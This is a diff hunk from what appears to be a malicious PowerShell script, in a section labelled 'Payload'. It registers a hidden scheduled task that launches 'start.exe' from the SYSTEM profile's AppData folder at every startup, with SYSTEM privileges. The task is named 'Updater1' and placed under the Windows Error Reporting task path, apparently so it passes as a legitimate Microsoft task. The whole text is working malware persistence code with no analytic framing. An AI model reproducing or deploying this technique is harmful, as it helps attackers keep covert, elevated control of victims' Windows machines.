@@ -9,7 +9,7 @@
 
 
 # Payload
-$A = New-ScheduledTaskAction -Execute '%appdata%\start.exe';
+$A = New-ScheduledTaskAction -Execute 'C:\Windows\System32\config\systemprofile\AppData\Roaming\start.exe';
 $T = New-ScheduledTaskTrigger -AtStartup;
 $S = New-ScheduledTaskSettingsSet -Hidden -RunOnlyIfNetworkAvailable -Priority 0
 Register-ScheduledTask -Action $A -Trigger $T -User 'NT AUTHORITY\SYSTEM' -RunLevel Highest -Force -Settings $S -TaskName 'Updater1' -TaskPath '\Microsoft\Windows\Windows Error Reporting\';
